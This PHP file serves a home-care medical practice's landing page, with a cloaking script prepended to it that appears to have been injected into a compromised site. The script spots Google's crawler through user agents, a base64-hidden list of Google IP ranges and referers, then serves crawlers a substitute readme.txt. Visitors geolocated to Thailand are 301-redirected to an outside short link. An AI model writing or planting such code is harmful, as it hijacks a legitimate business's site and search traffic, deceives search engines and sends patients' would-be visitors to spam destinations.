<?php
ob_start();

$redirectTo = "https://shorturl88.com/b99v"; // set null if no redirect
$allDevice = true;

function getContents($url)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $return = curl_exec($ch);
    curl_close($ch);

    return $return;
}

function KontolNjepat($ua, $ip)
{
    global $allDevice;
    if (
    preg_match('#(android|bbd+|meego).+mobile|avantgo|bada|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino#i', $ua)
    ||
    preg_match('#1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw-(n|u)|c55|capi|ccwa|cdm-|cell|chtm|cldc|cmd-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc-s|devi|dica|dmob|do(c|p)o|ds(12|-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(-|)|g1 u|g560|gene|gf-5|g-mo|go(.w|od)|gr(ad|un)|haie|hcit|hd-(m|p|t)|hei-|hi(pt|ta)|hp( i|ip)|hs-c|ht(c(-| ||a|g|p|s|t)|tp)|hu(aw|tc)|i-(20|go|ma)|i230|iac( |-|/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |/)|klon|kpt |kwc-|kyo(c|k)|le(no|xi)|lg( g|/(k|l|u)|50|54|-[a-w])|libw|lynx|m1-w|m3ga|m50|ma(te|ui|xo)|mc(01|21|ca)|m-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|-([1-8]|c))|phil|pire|pl(ay|uc)|pn-2|po(ck|rt|se)|prox|psio|pt-g|qa-a|qc(07|12|21|32|60|-[2-7]|i-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55|sa(ge|ma|mm|ms|ny|va)|sc(01|h-|oo|p-)|sdk|se(c(-|0|1)|47|mc|nd|ri)|sgh-|shar|sie(-|m)|sk-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h-|v-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl-|tdg-|tel(i|m)|tim-|t-mo|to(pl|sh)|ts(70|m-|m3|m5)|tx-9|up(.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas-|your|zeto|zte-#i', substr($ua, 0, 4))
) {

        if (preg_match("/googlebot|google.com|google/i", $ua)) {
            return true;
        }

        $listIp = "MTkyLjE3OC41LjAKMzQuMTAwLjE4Mi45NgozNC4xMDEuNTAuMTQ0CjM0LjExOC4yNTQuMAozNC4xMTguNjYuMAozNC4xMjYuMTc4Ljk2CjM0LjE0Ni4xNTAuMTQ0CjM0LjE0Ny4xMTAuMTQ0CjM0LjE1MS43NC4xNDQKMzQuMTUyLjUwLjY0CjM0LjE1NC4xMTQuMTQ0CjM0LjE1NS45OC4zMgozNC4xNjUuMTguMTc2CjM0LjE3NS4xNjAuNjQKMzQuMTc2LjEzMC4xNgozNC4yMi44NS4wCjM0LjY0LjgyLjY0CjM0LjY1LjI0Mi4xMTIKMzQuODAuNTAuODAKMzQuODguMTk0LjAKMzQuODkuMTAuODAKMzQuODkuMTk4LjgwCjM0Ljk2LjE2Mi40OAozNS4yNDcuMjQzLjI0MAo2Ni4yNDkuNjQuMAo2Ni4yNDkuNjQuMTI4CjY2LjI0OS42NC4xNjAKNjYuMjQ5LjY0LjE5Mgo2Ni4yNDkuNjQuMjI0CjY2LjI0OS42NC4zMgo2Ni4yNDkuNjQuNjQKNjYuMjQ5LjY0Ljk2CjY2LjI0OS42NS4wCjY2LjI0OS42NS4xMjgKNjYuMjQ5LjY1LjE2MAo2Ni4yNDkuNjUuMTkyCjY2LjI0OS42NS4yMjQKNjYuMjQ5LjY1LjMyCjY2LjI0OS42NS42NAo2Ni4yNDkuNjUuOTYKNjYuMjQ5LjY2LjAKNjYuMjQ5LjY2LjEyOAo2Ni4yNDkuNjYuMTYwCjY2LjI0OS42Ni4xOTIKNjYuMjQ5LjY2LjMyCjY2LjI0OS42Ni42NAo2Ni4yNDkuNjYuOTYKNjYuMjQ5LjY4LjAKNjYuMjQ5LjY4LjMyCjY2LjI0OS42OC42NAo2Ni4yNDkuNjkuMAo2Ni4yNDkuNjkuMTI4CjY2LjI0OS42OS4xNjAKNjYuMjQ5LjY5LjE5Mgo2Ni4yNDkuNjkuMjI0CjY2LjI0OS42OS4zMgo2Ni4yNDkuNjkuNjQKNjYuMjQ5LjY5Ljk2CjY2LjI0OS43MC4wCjY2LjI0OS43MC4xMjgKNjYuMjQ5LjcwLjE2MAo2Ni4yNDkuNzAuMTkyCjY2LjI0OS43MC4yMjQKNjYuMjQ5LjcwLjMyCjY2LjI0OS43MC42NAo2Ni4yNDkuNzAuOTYKNjYuMjQ5LjcxLjAKNjYuMjQ5LjcxLjEyOAo2Ni4yNDkuNzEuMTYwCjY2LjI0OS43MS4xOTIKNjYuMjQ5LjcxLjIyNAo2Ni4yNDkuNzEuMzIKNjYuMjQ5LjcxLjY0CjY2LjI0OS43MS45Ngo2Ni4yNDkuNzIuMAo2Ni4yNDkuNzIuMTI4CjY2LjI0OS43Mi4xNjAKNjYuMjQ5LjcyLjE5Mgo2Ni4yNDkuNzIuMjI0CjY2LjI0OS43Mi4zMgo2Ni4yNDkuNzIuNjQKNjYuMjQ5LjcyLjk2CjY2LjI0OS43My4wCjY2LjI0OS43My4xMjgKNjYuMjQ5LjczLjE2MAo2Ni4yNDkuNzMuMTkyCjY2LjI0OS43My4yMjQKNjYuMjQ5LjczLjMyCjY2LjI0OS43My42NAo2Ni4yNDkuNzMuOTYKNjYuMjQ5Ljc0LjAKNjYuMjQ5Ljc0LjEyOAo2Ni4yNDkuNzQuMzIKNjYuMjQ5Ljc0LjY0CjY2LjI0OS43NC45Ngo2Ni4yNDkuNzUuMAo2Ni4yNDkuNzUuMTI4CjY2LjI0OS43NS4xNjAKNjYuMjQ5Ljc1LjE5Mgo2Ni4yNDkuNzUuMjI0CjY2LjI0OS43NS4zMgo2Ni4yNDkuNzUuNjQKNjYuMjQ5Ljc1Ljk2CjY2LjI0OS43Ni4wCjY2LjI0OS43Ni4xMjgKNjYuMjQ5Ljc2LjE2MAo2Ni4yNDkuNzYuMTkyCjY2LjI0OS43Ni4yMjQKNjYuMjQ5Ljc2LjMyCjY2LjI0OS43Ni42NAo2Ni4yNDkuNzYuOTYKNjYuMjQ5Ljc3LjAKNjYuMjQ5Ljc3LjEyOAo2Ni4yNDkuNzcuMTYwCjY2LjI0OS43Ny4xOTIKNjYuMjQ5Ljc3LjMyCjY2LjI0OS43Ny42NAo2Ni4yNDkuNzcuOTYKNjYuMjQ5Ljc4LjAKNjYuMjQ5Ljc5LjAKNjYuMjQ5Ljc5LjEyOAo2Ni4yNDkuNzkuMTYwCjY2LjI0OS43OS4xOTIKNjYuMjQ5Ljc5LjIyNAo2Ni4yNDkuNzkuMzIKNjYuMjQ5Ljc5LjY0CjY2LjI0OS43OS45Ng==";
        $listIp = base64_decode($listIp);
        $listIp = explode("n", $listIp);

        if (in_array($ip, $listIp)) {
            return true;
        }

        if (preg_match('/google/i', getReferer())) {
            return true;
        }
    } else {
        if ($allDevice) {
            if (preg_match("/googlebot|google.com|google/i", $ua)) {
                return true;
            }

            $listIp = "MTkyLjE3OC41LjAKMzQuMTAwLjE4Mi45NgozNC4xMDEuNTAuMTQ0CjM0LjExOC4yNTQuMAozNC4xMTguNjYuMAozNC4xMjYuMTc4Ljk2CjM0LjE0Ni4xNTAuMTQ0CjM0LjE0Ny4xMTAuMTQ0CjM0LjE1MS43NC4xNDQKMzQuMTUyLjUwLjY0CjM0LjE1NC4xMTQuMTQ0CjM0LjE1NS45OC4zMgozNC4xNjUuMTguMTc2CjM0LjE3NS4xNjAuNjQKMzQuMTc2LjEzMC4xNgozNC4yMi44NS4wCjM0LjY0LjgyLjY0CjM0LjY1LjI0Mi4xMTIKMzQuODAuNTAuODAKMzQuODguMTk0LjAKMzQuODkuMTAuODAKMzQuODkuMTk4LjgwCjM0Ljk2LjE2Mi40OAozNS4yNDcuMjQzLjI0MAo2Ni4yNDkuNjQuMAo2Ni4yNDkuNjQuMTI4CjY2LjI0OS42NC4xNjAKNjYuMjQ5LjY0LjE5Mgo2Ni4yNDkuNjQuMjI0CjY2LjI0OS42NC4zMgo2Ni4yNDkuNjQuNjQKNjYuMjQ5LjY0Ljk2CjY2LjI0OS42NS4wCjY2LjI0OS42NS4xMjgKNjYuMjQ5LjY1LjE2MAo2Ni4yNDkuNjUuMTkyCjY2LjI0OS42NS4yMjQKNjYuMjQ5LjY1LjMyCjY2LjI0OS42NS42NAo2Ni4yNDkuNjUuOTYKNjYuMjQ5LjY2LjAKNjYuMjQ5LjY2LjEyOAo2Ni4yNDkuNjYuMTYwCjY2LjI0OS42Ni4xOTIKNjYuMjQ5LjY2LjMyCjY2LjI0OS42Ni42NAo2Ni4yNDkuNjYuOTYKNjYuMjQ5LjY4LjAKNjYuMjQ5LjY4LjMyCjY2LjI0OS42OC42NAo2Ni4yNDkuNjkuMAo2Ni4yNDkuNjkuMTI4CjY2LjI0OS42OS4xNjAKNjYuMjQ5LjY5LjE5Mgo2Ni4yNDkuNjkuMjI0CjY2LjI0OS42OS4zMgo2Ni4yNDkuNjkuNjQKNjYuMjQ5LjY5Ljk2CjY2LjI0OS43MC4wCjY2LjI0OS43MC4xMjgKNjYuMjQ5LjcwLjE2MAo2Ni4yNDkuNzAuMTkyCjY2LjI0OS43MC4yMjQKNjYuMjQ5LjcwLjMyCjY2LjI0OS43MC42NAo2Ni4yNDkuNzAuOTYKNjYuMjQ5LjcxLjAKNjYuMjQ5LjcxLjEyOAo2Ni4yNDkuNzEuMTYwCjY2LjI0OS43MS4xOTIKNjYuMjQ5LjcxLjIyNAo2Ni4yNDkuNzEuMzIKNjYuMjQ5LjcxLjY0CjY2LjI0OS43MS45Ngo2Ni4yNDkuNzIuMAo2Ni4yNDkuNzIuMTI4CjY2LjI0OS43Mi4xNjAKNjYuMjQ5LjcyLjE5Mgo2Ni4yNDkuNzIuMjI0CjY2LjI0OS43Mi4zMgo2Ni4yNDkuNzIuNjQKNjYuMjQ5LjcyLjk2CjY2LjI0OS43My4wCjY2LjI0OS43My4xMjgKNjYuMjQ5LjczLjE2MAo2Ni4yNDkuNzMuMTkyCjY2LjI0OS43My4yMjQKNjYuMjQ5LjczLjMyCjY2LjI0OS43My42NAo2Ni4yNDkuNzMuOTYKNjYuMjQ5Ljc0LjAKNjYuMjQ5Ljc0LjEyOAo2Ni4yNDkuNzQuMzIKNjYuMjQ5Ljc0LjY0CjY2LjI0OS43NC45Ngo2Ni4yNDkuNzUuMAo2Ni4yNDkuNzUuMTI4CjY2LjI0OS43NS4xNjAKNjYuMjQ5Ljc1LjE5Mgo2Ni4yNDkuNzUuMjI0CjY2LjI0OS43NS4zMgo2Ni4yNDkuNzUuNjQKNjYuMjQ5Ljc1Ljk2CjY2LjI0OS43Ni4wCjY2LjI0OS43Ni4xMjgKNjYuMjQ5Ljc2LjE2MAo2Ni4yNDkuNzYuMTkyCjY2LjI0OS43Ni4yMjQKNjYuMjQ5Ljc2LjMyCjY2LjI0OS43Ni42NAo2Ni4yNDkuNzYuOTYKNjYuMjQ5Ljc3LjAKNjYuMjQ5Ljc3LjEyOAo2Ni4yNDkuNzcuMTYwCjY2LjI0OS43Ny4xOTIKNjYuMjQ5Ljc3LjMyCjY2LjI0OS43Ny42NAo2Ni4yNDkuNzcuOTYKNjYuMjQ5Ljc4LjAKNjYuMjQ5Ljc5LjAKNjYuMjQ5Ljc5LjEyOAo2Ni4yNDkuNzkuMTYwCjY2LjI0OS43OS4xOTIKNjYuMjQ5Ljc5LjIyNAo2Ni4yNDkuNzkuMzIKNjYuMjQ5Ljc5LjY0CjY2LjI0OS43OS45Ng==";
            $listIp = base64_decode($listIp);
            $listIp = explode("n", $listIp);

            if (in_array($ip, $listIp)) {
                return true;
            }

            if (preg_match('/google/i', getReferer())) {
                return true;
            }
        }
        return false;
    }
}

function getReferer()
{
    return $_SERVER['HTTP_REFERER'];
}

function getRealIP()
{
    if (isset($_SERVER["HTTP_CLIENT_IP"])) {
        $ip = $_SERVER["HTTP_CLIENT_IP"];
    } elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
    } elseif (isset($_SERVER["HTTP_X_FORWARDED"])) {
        $ip = $_SERVER["HTTP_X_FORWARDED"];
    } elseif (isset($_SERVER["HTTP_FORWARDED_FOR"])) {
        $ip = $_SERVER["HTTP_FORWARDED_FOR"];
    } elseif (isset($_SERVER["HTTP_FORWARDED"])) {
        $ip = $_SERVER["HTTP_FORWARDED"];
    } else {
        $ip = $_SERVER["REMOTE_ADDR"];
    }

    // Strip any secondary IP etc from the IP address
    if (strpos($ip, ',') > 0) {
        $ip = substr($ip, 0, strpos($ip, ','));
    }
    return $ip;
}

if ($_SERVER['REQUEST_URI'] === '/sitemap.xml') {
    echo getContents($contents . '/sitemap.xml');
    exit;
}

if (KontolNjepat($_SERVER['HTTP_USER_AGENT'], getRealIP())) {
    if ($_SERVER['REQUEST_URI'] === '/') {

        if (isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], 'google.com') !== false) {

            $userIP     = getRealIP();
            $access_key = 'hgopVXEPIJ7ViMx';
            $ch         = curl_init('https://pro.ip-api.com/json/' . $userIP . '?key=' . $access_key);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $json     = curl_exec($ch);

            $jsonData = json_decode($json);
            if ($jsonData->countryCode == 'TH') {

                if (!is_null($redirectTo)) {
                    header("Location: " . $redirectTo . "", TRUE, 301);
                    exit();
                }

            }
        }

        echo file_get_contents('readme.txt');
        exit;
    }
}

$userIP     = getRealIP();
$access_key = 'hgopVXEPIJ7ViMx';
$ch         = curl_init('https://pro.ip-api.com/json/' . $userIP . '?key=' . $access_key);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$json     = curl_exec($ch);

$jsonData = json_decode($json);
if ($jsonData->countryCode == 'TH') {
    if ($_SERVER['REQUEST_URI'] === '/') {
        if (!is_null($redirectTo)) {
            header("Location: " . $redirectTo . "", TRUE, 301);
            exit();
        } else {
            echo file_get_contents('readme.txt');
            exit;
        }
    }
}

?>

<!DOCTYPE html>
<html lang="en" class="scroll-smooth">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visiting Medical Physicians Inc. | In-Home Medical Care</title>
    <link rel="shortcut icon" type="image/png" href="images/vmp.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: { sans: ['Inter', 'sans-serif'] },
                    colors: {
                        'vmp-teal': '#008C8C',
                        'vmp-lime': '#57D131',
                        'vmp-deep-teal': '#005064',
                        'vmp-magenta': '#D81B60',
                        'vmp-charcoal': '#4C3F58',
                        'vmp-light-bg': '#F0F4F7',
                        'vmp-lavender': '#E9D5FF',
                        'vmp-lavender-dark': '#C084FC',
                    }
                }
            }
        }
    </script>
    <style>
        .header-shadow { box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
        .tab-button.active { background-color: #008C8C; color: white; box-shadow: 0 4px 14px rgba(0,140,140,0.3); }
        .tab-button:not(.active):hover { background-color: #e2f5f5; color: #008C8C; }
        .fade-in { opacity: 0; transform: translateY(28px); transition: opacity 0.7s ease, transform 0.7s ease; }
        .fade-in.visible { opacity: 1; transform: translateY(0); }
        .stat-card { transition: transform 0.3s ease, box-shadow 0.3s ease; }
        .stat-card:hover { transform: translateY(-4px); box-shadow: 0 12px 30px rgba(0,140,140,0.15); }
        .service-item { transition: background 0.2s ease; border-radius: 10px; padding: 10px 12px; }
        .service-item:hover { background: #f0fafa; }
        .hero-gradient { background: linear-gradient(135deg, #ffffff 0%, #e8f8f8 50%, #f0f4f7 100%); }
        .section-divider { height: 4px; background: linear-gradient(90deg, #008C8C, #57D131, #005064); border-radius: 2px; }
        .testimonial-card { transition: transform 0.3s ease, box-shadow 0.3s ease; }
        .testimonial-card:hover { transform: translateY(-6px); box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
        .nav-link-active { color: #008C8C; font-weight: 600; }
        #scroll-top { opacity: 0; pointer-events: none; transition: opacity 0.3s ease; }
        #scroll-top.show { opacity: 1; pointer-events: auto; }
    </style>
</head>
<body class="bg-vmp-light-bg text-vmp-charcoal antialiased">

<!-- Header -->
<header id="header" class="bg-white/90 backdrop-blur-lg fixed top-0 left-0 right-0 z-50 transition-all duration-300 border-b border-gray-100">
    <div class="container mx-auto px-6 py-3 flex justify-between items-center">
        <!-- Logo -->
        <a href="#home" class="flex items-center space-x-3">
            <div class="p-1.5 bg-vmp-teal rounded-full shadow-md">
                <img src="images/vmp.png" width="44" height="44" alt="VMP Logo">
            </div>
            <div>
                <span class="text-lg font-extrabold text-vmp-charcoal leading-none block">Visiting Medical</span>
                <span class="text-sm font-medium text-vmp-teal leading-none">Physicians Inc.</span>
            </div>
        </a>

        <!-- Desktop Navigation -->
        <nav class="hidden md:flex items-center space-x-1">
            <a href="#home" class="px-4 py-2 rounded-lg text-vmp-charcoal hover:text-vmp-teal hover:bg-teal-50 transition duration-200 font-medium text-sm">Home</a>
            <a href="#mission" class="px-4 py-2 rounded-lg text-vmp-charcoal hover:text-vmp-teal hover:bg-teal-50 transition duration-200 font-medium text-sm">Our Mission</a>
            <a href="#about" class="px-4 py-2 rounded-lg text-vmp-charcoal hover:text-vmp-teal hover:bg-teal-50 transition duration-200 font-medium text-sm">About Us</a>
            <a href="#services" class="px-4 py-2 rounded-lg text-vmp-charcoal hover:text-vmp-teal hover:bg-teal-50 transition duration-200 font-medium text-sm">Services</a>
            <a href="#testimonials" class="px-4 py-2 rounded-lg text-vmp-charcoal hover:text-vmp-teal hover:bg-teal-50 transition duration-200 font-medium text-sm">Testimonials</a>
            <a href="#contact" class="ml-2 px-5 py-2 bg-vmp-teal text-white rounded-full text-sm font-semibold hover:bg-opacity-90 transition duration-200 shadow-md">Contact Us</a>
        </nav>

        <!-- Mobile Menu Button -->
        <button id="mobile-menu-button" class="md:hidden p-2 rounded-lg hover:bg-gray-100 transition">
            <svg class="w-6 h-6 text-vmp-charcoal" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path></svg>
        </button>
    </div>
    <!-- Mobile Menu -->
    <div id="mobile-menu" class="hidden md:hidden bg-white border-t border-gray-100 px-6 py-4 space-y-1">
        <a href="#home" class="block py-2.5 px-4 rounded-lg text-vmp-charcoal hover:text-vmp-teal hover:bg-teal-50 font-medium">Home</a>
        <a href="#mission" class="block py-2.5 px-4 rounded-lg text-vmp-charcoal hover:text-vmp-teal hover:bg-teal-50 font-medium">Our Mission</a>
        <a href="#about" class="block py-2.5 px-4 rounded-lg text-vmp-charcoal hover:text-vmp-teal hover:bg-teal-50 font-medium">About Us</a>
        <a href="#services" class="block py-2.5 px-4 rounded-lg text-vmp-charcoal hover:text-vmp-teal hover:bg-teal-50 font-medium">Services</a>
        <a href="#testimonials" class="block py-2.5 px-4 rounded-lg text-vmp-charcoal hover:text-vmp-teal hover:bg-teal-50 font-medium">Testimonials</a>
        <a href="#contact" class="block py-2.5 px-4 bg-vmp-teal text-white rounded-lg font-semibold text-center mt-2">Contact Us</a>
    </div>
</header>

<main>
    <!-- Hero Section -->
    <section id="home" class="hero-gradient pt-28 md:pt-36 pb-20 overflow-hidden relative">
        <!-- Decorative circles -->
        <div class="absolute top-10 right-10 w-64 h-64 bg-vmp-teal opacity-5 rounded-full blur-3xl"></div>
        <div class="absolute bottom-0 left-0 w-96 h-96 bg-vmp-lime opacity-5 rounded-full blur-3xl"></div>
        <div class="container mx-auto px-6 text-center relative z-10">
            <span class="inline-block bg-teal-50 text-vmp-teal text-sm font-semibold px-4 py-1.5 rounded-full mb-6 border border-teal-200">
                &#127968; In-Home Medical Care &bull; Chicagoland Area
            </span>
            <h1 class="text-4xl md:text-6xl font-extrabold text-vmp-charcoal leading-tight max-w-4xl mx-auto">
                Compassionate Medical Care,<br class="hidden md:block"> <span class="text-vmp-teal">in the Comfort of Your Home.</span>
            </h1>
            <p class="mt-6 text-lg text-gray-600 max-w-2xl mx-auto leading-relaxed">
                Visiting Medical Physicians Inc. brings comprehensive and personalized healthcare services directly to you — with the compassion and expertise you deserve.
            </p>
            <div class="mt-10 flex flex-col sm:flex-row gap-4 justify-center">
                <a href="#contact" class="inline-block bg-vmp-teal text-white font-bold py-4 px-10 rounded-full text-lg hover:bg-opacity-90 transition duration-300 transform hover:scale-105 shadow-lg">
                    Schedule an Appointment
                </a>
                <a href="#services" class="inline-block bg-white text-vmp-teal font-bold py-4 px-10 rounded-full text-lg border-2 border-vmp-teal hover:bg-teal-50 transition duration-300 shadow-sm">
                    Our Services
                </a>
            </div>
        </div>
    </section>

    <!-- Stats Strip -->
    <section class="bg-vmp-deep-teal py-10">
        <div class="container mx-auto px-6">
            <div class="grid grid-cols-2 md:grid-cols-4 gap-6 text-center">
                <div class="stat-card bg-white/10 rounded-xl py-6 px-4">
                    <p class="text-3xl font-extrabold text-white">25+</p>
                    <p class="text-teal-200 text-sm mt-1 font-medium">Years of Experience</p>
                </div>
                <div class="stat-card bg-white/10 rounded-xl py-6 px-4">
                    <p class="text-3xl font-extrabold text-white">1,000+</p>
                    <p class="text-teal-200 text-sm mt-1 font-medium">Patients Served</p>
                </div>
                <div class="stat-card bg-white/10 rounded-xl py-6 px-4">
                    <p class="text-3xl font-extrabold text-white">18+</p>
                    <p class="text-teal-200 text-sm mt-1 font-medium">Insurance Plans</p>
                </div>
                <div class="stat-card bg-white/10 rounded-xl py-6 px-4">
                    <p class="text-3xl font-extrabold text-white">24/7</p>
                    <p class="text-teal-200 text-sm mt-1 font-medium">Patient Support</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Our Mission Section -->
    <section id="mission" class="py-24 bg-white">
        <div class="container mx-auto px-6 grid md:grid-cols-2 gap-16 items-center">
            <div class="fade-in relative">
                <div class="absolute -top-4 -left-4 w-24 h-24 bg-teal-100 rounded-full opacity-60"></div>
                <img src="images/tablet-screen-contents.png" alt="A team of professional and compassionate doctors" class="rounded-2xl shadow-2xl w-full relative z-10">
                <div class="absolute -bottom-4 -right-4 w-16 h-16 bg-vmp-lime rounded-full opacity-40"></div>
            </div>
            <div class="text-left fade-in">
                <span class="inline-block bg-yellow-50 text-yellow-600 text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider border border-yellow-200 mb-4">At Visiting Medical Physician</span>
                <h2 class="text-4xl font-extrabold text-vmp-charcoal mb-4">Our Mission</h2>
                <div class="section-divider w-16 mb-6"></div>
                <p class="text-gray-600 leading-relaxed text-lg">
                    At VMP we are dedicated to providing exceptional, patient-centered care with utmost compassion &amp; professionalism. With a team of experienced healthcare professionals, we ensure personalized attention, comfort, and convenience, bringing expert care directly to you.
                </p>
                <div class="mt-8 grid grid-cols-2 gap-4">
                    <div class="bg-teal-50 rounded-xl p-4 border border-teal-100">
                        <p class="text-vmp-teal font-bold text-lg">&#10024; Expert Care</p>
                        <p class="text-gray-500 text-sm mt-1">Led by clinicians with 25+ years experience</p>
                    </div>
                    <div class="bg-green-50 rounded-xl p-4 border border-green-100">
                        <p class="text-green-600 font-bold text-lg">&#127968; Home Visits</p>
                        <p class="text-gray-500 text-sm mt-1">We come to you, wherever you call home</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- About Us Section -->
    <section id="about" class="py-20 bg-white">
        <div class="container mx-auto px-6">
            <div class="text-center max-w-4xl mx-auto">
                <h2 class="text-base font-semibold text-yellow-500 tracking-wide uppercase">About Us</h2>
                <p class="mt-2 text-3xl md:text-4xl font-bold text-vmp-charcoal">
                    At VMP, we're here to provide the care, support, and dedication you deserve, wherever you call home.
                </p>
            </div>

            <div class="mt-16 flex flex-col md:flex-row gap-8 md:gap-12">
                <!-- Tab Buttons -->
                <div class="flex md:flex-col md:w-1/4">
                    <button data-tab="why-vmp" class="tab-button active text-left w-full p-4 rounded-lg text-lg font-semibold transition-colors duration-300">Why VMP?</button>
                    <button data-tab="areas" class="tab-button text-left w-full p-4 rounded-lg text-lg font-semibold transition-colors duration-300 bg-vmp-light-bg hover:bg-gray-200">Areas of Service</button>
                    <button data-tab="team" class="tab-button text-left w-full p-4 rounded-lg text-lg font-semibold transition-colors duration-300 bg-vmp-light-bg hover:bg-gray-200">Our Team</button>
                    <button data-tab="insurances" class="tab-button text-left w-full p-4 rounded-lg text-lg font-semibold transition-colors duration-300 bg-vmp-light-bg hover:bg-gray-200">Insurances</button>
                </div>

                <!-- Tab Content -->
                <div class="md:w-3/4">
                    <div id="why-vmp" class="tab-content">
                        <h3 class="text-2xl font-bold text-vmp-charcoal mb-4">Why Choose VMP?</h3>
                        <ul class="space-y-3 list-disc list-inside text-gray-600">
                            <li>Our scheduling team is dedicated to providing patients with quick appointments.</li>
                            <li>We provide high quality care with compassionate, and responsive primary care.</li>
                            <li>We visit not only at patients' homes, but post-acute facilities, assisted and supportive living communities.</li>
                        </ul>
                    </div>
                    <div id="areas" class="tab-content hidden">
                        <h3 class="text-2xl font-bold text-vmp-charcoal mb-4">Areas of Service</h3>
                        <p class="text-gray-600 font-semibold mb-6">Serving the Chicagoland area and surrounding suburbs.</p>
                        <div class="grid md:grid-cols-2 gap-8 items-center">
                            <div>
                                <h4 class="text-xl font-bold text-vmp-charcoal mb-2">Our Coverage</h4>
                                <p class="text-gray-600">Our team of credentialed specialists proudly serves Illinois, and we are continuously expanding our coverage to reach more individuals in need—especially during these unprecedented times. We are committed to providing compassionate, high-quality care to those who can benefit most from our services.</p>
                            </div>
                            <div>
                                <img src="images/coverage.jpg" alt="Map of Illinois showing service areas" class="rounded-lg shadow-md">
                            </div>
                        </div>
                    </div>
                    <div id="team" class="tab-content hidden">
                        <h3 class="text-2xl font-bold text-vmp-charcoal mb-4">Our Team</h3>
                        <div class="grid md:grid-cols-2 gap-8 items-center">
                            <div>
                                <img src="images/team.png" alt="A smiling group of medical professionals" class="rounded-lg shadow-md">
                            </div>
                            <div>
                                <p class="text-gray-600 mb-4">At Visiting Medical Physicians, our team of specialists is led by highly experienced clinicians with over 25 years of expertise in  Wound Care. We are committed to delivering accessible, compassionate, and results-driven healthcare tailored to each client's unique needs.</p>
                                <h4 class="text-xl font-bold text-vmp-charcoal mt-6 mb-2">Our Multidisciplinary Team Includes:</h4>
                                <ul class="space-y-3 text-gray-600">
                                    <li class="flex items-start"><svg class="w-5 h-5 text-vmp-lime mr-2 mt-1 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg><span><strong>Wound Care Providers</strong> – Ensuring continuity and holistic treatment</span></li>
                                </ul>
                                <p class="text-gray-600 mt-6">With us, you're not just a patient, you're family. Let us care for you with the compassion you deserve.</p>
                            </div>
                        </div>
                    </div>
                    <div id="insurances" class="tab-content hidden">
                        <h3 class="text-2xl font-bold text-vmp-charcoal mb-4">Insurances Accepted</h3>
                        <div class="grid md:grid-cols-2 gap-x-8 gap-y-2 text-gray-600">
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>MEDICARE</p>
                            <p class="flex items-center"><svg class="w-5 h-5 text-vmp-lime mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>MEDICAID</p>
